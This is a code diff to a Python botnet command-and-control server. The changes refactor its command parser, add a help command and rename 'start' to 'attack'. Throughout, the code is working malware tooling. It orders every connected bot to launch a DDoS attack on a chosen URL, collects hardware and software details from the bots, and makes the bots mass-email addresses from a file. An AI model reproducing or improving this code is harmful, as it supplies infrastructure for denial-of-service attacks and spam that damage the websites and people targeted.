@@ -12,18 +12,19 @@ class CnC:
 
     def __init__(self, host: str, port: int):
         self.__address = (host, port)
-        self.__bots = {}  # TODO refactor to list of bots
+        self.__bots = {}
         self.__load_bots()
 
         self.__cmds = {
-            'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': False},
-            'bots': {'fun': self.__list_bots, 'desc': self.__list_bots.__doc__, 'args': False},
-            'info': {'fun': self.__info, 'desc': self.__info.__doc__, 'args': True},
-            'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': True},
-            'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': True},
-            'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': False},
-            'email': {'fun': self.__email, 'desc': self.__email.__doc__, 'args': True},
-            'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': False}
+            'commands': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': 0},
+            'help': {'fun': self.__help, 'desc': self.__help.__doc__, 'args': 1},
+            'bots': {'fun': self.__list_bots, 'desc': self.__list_bots.__doc__, 'args': 0},
+            'info': {'fun': self.__info, 'desc': self.__info.__doc__, 'args': 1},
+            'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': 1},
+            'attack': {'fun': self.__attack, 'desc': self.__attack.__doc__, 'args': 1},
+            'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': 0},
+            'email': {'fun': self.__email, 'desc': self.__email.__doc__, 'args': 2},
+            'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': 0}
         }
         self.__lock = threading.Lock()  # lock for thread-safe access to attributes
 
@@ -88,13 +89,29 @@ class CnC:
 
     def __commands(self) -> str:
         """
-        Lists all the commands.
+        Lists all the commands available.
         """
-        return "\n\t- " + "\n\t- ".join(f"{cmd}: {self.__cmds[cmd]['desc'].strip()}" for cmd in self.__cmds.keys())
+        return "\n- " + "\n- ".join(
+            f"{cmd}:\n\t" + self.__cmds[cmd]['desc'].strip().split("\n")[0]
+            for cmd in self.__cmds.keys()
+        )
+
+    def __help(self, args):
+        """
+        Prints the description of a specific command.
+
+            > help cmd
+
+        cmd: command name
+        """
+        cmd = args[0]
+        if cmd not in self.__cmds.keys():
+            return f"Command {cmd} does not exists."
+        return f"{cmd}:\n\t" + self.__cmds[cmd]['desc'].strip()
 
     def __list_bots(self) -> str:
         """
-        Lists the bots that are connected to the botnet.
+        Lists all the bots that are online and connected to the botnet.
         """
         res = "Bots connected:\n"
         responses = self.__send_gets('/status')
@@ -105,59 +122,73 @@ class CnC:
         for addr, resp in responses.items():
             status = json.loads(resp.text)
             res += f"\t- IP:\t{addr}\n\t  Port:\t{self.__bots[addr]}\n\t  Action:\t{status['action']}\n" \
-                   f"\t  Targets:\t{status['targets']}\n "
+                   f"\t  Target:\t{status['target']}\n "
         return res
 
-    def __get_something(self, addresses, path) -> str:
+    def __get_something(self, address, path) -> str:
         """
-        Get info or status.
+        Gets info or status.
         """
         res = ""
-        responses = self.__send_gets(path, addresses=addresses)
+        responses = self.__send_gets(path, addresses=[address])
         if responses is None:
             return "No bots connected."
-        for addr, resp in responses.items():
-            res += f"\nBot {addr}:\n"
+        resp = responses[address]
 
-            if resp is not None and resp.status_code == 200:
-                for k, v in json.loads(resp.text).items():
-                    res += f"\t- {k}: {v}\n"
-            else:
-                res += "\tBot is not connected.\n"
+        if resp is None or resp.status_code != 200:
+            return "Bot is not connected.\n"
+        res += f"\nBot {address}:\n"
+        for k, v in json.loads(resp.text).items():
+            res += f"\t- {k}: {v}\n"
         return res
 
-    def __status(self, addresses):
+    def __status(self, args):
         """
-        Check the status of a specific bot given his IP addresses.
-        """
-        return self.__get_something(addresses, "/status")
+        Checks the status of a specific bot given his IP addresses.
 
-    def __info(self, addresses):
-        """
-        Get information about the software and hardware configurations of specific bots given their IP addresses.
-        """
-        return self.__get_something(addresses, "/info")
+            > status address
 
-    def __start(self, urls):
+        address: IP addresses of the bot
         """
-        Start a DDoS attack to the given  urls.
+        return self.__get_something(args[0], "/status")
+
+    def __info(self, args):
+        """
+        Gets information about the software and hardware configurations of a specific bot given his IP address.
+
+            > info address
+
+        address: IP address of the bot
+        """
+        return self.__get_something(args[0], "/info")
+
+    def __attack(self, args):
+        """
+        Starts a DDoS attack to the given  url.
+
+            > attack url
+
+        urls: the url of the resource to attack
         """
         with self.__lock:
             if len(self.__bots) == 0:
                 return "No bot connected."
-            responses = set()
-            for url in urls:
-                responses = responses.union({
-                    requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
-                    for address, port in self.__bots.items()
-                })
-        if len(responses) == 1 and responses.pop() != 200:
-            return "Attack did not start..."
+            url = args[0]
+            responses = {
+                requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
+                for address, port in self.__bots.items()
+            }
+        if len(responses) == 1:
+            code = responses.pop()
+            if code == 403:
+                return "An attack is already going on."
+            if code != 200:
+                return "Attack did not start..."
         return "Attack started successfully!"
 
     def __stop(self):
         """
-        Stop the running DDoS attacks.
+        Stops the running DDoS attacks.
         """
         responses = self.__send_gets('/stop')
 
@@ -166,24 +197,36 @@ class CnC:
 
         codes = {r.status_code for r in responses.values()}
 
-        if len(codes) != 1:
-            return "Attack did not stop..."
-        code = codes.pop()
-        if code == 406:
+        if len(codes) == 1 and codes.pop() == 406:
             return "There isn't any attack running"
         return "Attack stopped successfully!"
 
-    def __email(self, file):
+    def __email(self, files):
         """
         Makes all the bot connected email every address stored in the given file.
+
+            > email addresses_path message_path
+
+        addresses_path: path to a JSON file containing a list of addresses to mail.
+        message_path: path to a text file containing the message to send.
         """
+        addresses_path, message_path = files
+
+        try:
+            with open(addresses_path, 'r') as f:
+                emails = json.load(f)
+        except FileNotFoundError:
+            return f"The file {addresses_path} does not exists."
+
+        try:
+            with open(message_path, 'r', encoding='utf-8') as f:
+                subj, txt = f.read().split('\n\n', 1)
+        except FileNotFoundError:
+            return f"The file {message_path} does not exists"
+
         with self.__lock:
             if len(self.__bots) == 0:
                 return "No bot connected."
-            with open(file[0], 'r') as f:
-                emails = json.load(f)
-            with open(file[1], 'r', encoding='utf-8') as f:
-                subj, txt = f.read().split('\n\n', 1)
 
             to_send = {'emails': emails, 'subj': subj, 'txt': txt}
             responses = {
@@ -196,7 +239,7 @@ class CnC:
 
     def __exit(self) -> str:
         """
-        Close the botnet.
+        Closes the Command & Control.
         """
         with self.__lock:
             bots = json.dumps(self.__bots, indent=4)
@@ -214,7 +257,7 @@ class CnC:
         cmd = 0
 
         while cmd != "exit":
-            print("\n('help' to view the commands list).")
+            print("\n(type 'commands' to view the commands list).")
             cmd = str.lower(input("\n> "))
             result = self.__run_cmd(cmd)
             print(result)
@@ -223,20 +266,23 @@ class CnC:
 
     def __run_cmd(self, line):
         try:
-            if ' ' in line:
+            if ' ' in line:  # if cmd has args
                 cmd, args = line.split(' ', 1)
                 args = args.split(' ')
-                if self.__cmds[cmd]['args']:
-                    return self.__cmds[cmd]['fun'](args)
-                else:
+                if self.__cmds[cmd]['args'] < len(args):
                     return "Too many arguments."
-            else:
+                elif self.__cmds[cmd]['args'] > len(args):
+                    return "Too few arguments"
+                else:
+                    return self.__cmds[cmd]['fun'](args)
+            else:  # if cmd has not args
                 cmd = line
-                if self.__cmds[cmd]['args']:
+                if self.__cmds[cmd]['args'] > 0:
                     return "Too few arguments."
                 else:
                     return self.__cmds[cmd]['fun']()
-        except KeyError:
+        except KeyError as e:
+            # print(e)
             return "Command not recognized."
 
 
